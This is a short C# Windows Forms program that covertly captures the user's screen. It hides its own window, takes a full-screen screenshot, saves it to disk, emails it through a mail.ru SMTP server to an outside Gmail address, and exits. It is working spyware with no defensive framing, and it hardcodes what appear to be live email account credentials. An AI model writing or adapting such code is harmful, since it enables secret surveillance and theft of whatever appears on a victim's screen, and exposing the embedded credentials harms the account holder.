using System.Drawing.Imaging;
using System.Net;
using System.Threading;
using System.Net.Mail;
using System.Text;


namespace just
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.Opacity = 0;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.WindowState = System.Windows.Forms.FormWindowState.Minimized;


            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            Graphics graphics = Graphics.FromImage(bitmap as Image);

            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);

            Random rnd = new Random();
            int sk = rnd.Next(10000);

            bitmap.Save(@"D:\photo\" + sk + ".jpg", ImageFormat.Jpeg);

            string file = "D:\\photo\\" + sk + ".jpg";
            Attachment attach = new Attachment(file, System.Net.Mime.MediaTypeNames.Application.Octet);
            
            SmtpClient client = new SmtpClient();
            client.Port = 25;
            client.Host = "smtp.mail.ru";
            client.EnableSsl = true;
            client.Timeout = 10000;
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.UseDefaultCredentials = false;
            client.Credentials = new System.Net.NetworkCredential("zlotnikova.66@mail.ru", "7d43YsGse7pX6hwfpeQv");

            var sendMailThread = new Thread(() => {
                MailMessage mm = new MailMessage("zlotnikova.66@mail.ru", "zlotnikova.0202@gmail.com", "здарова", "помоги");
                mm.Attachments.Add(attach);
                mm.BodyEncoding = UTF8Encoding.UTF8;
                mm.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;
                client.Send(mm);
            });
            sendMailThread.Start(); 

            bitmap.Dispose();
            Application.Exit();
        }
    }
}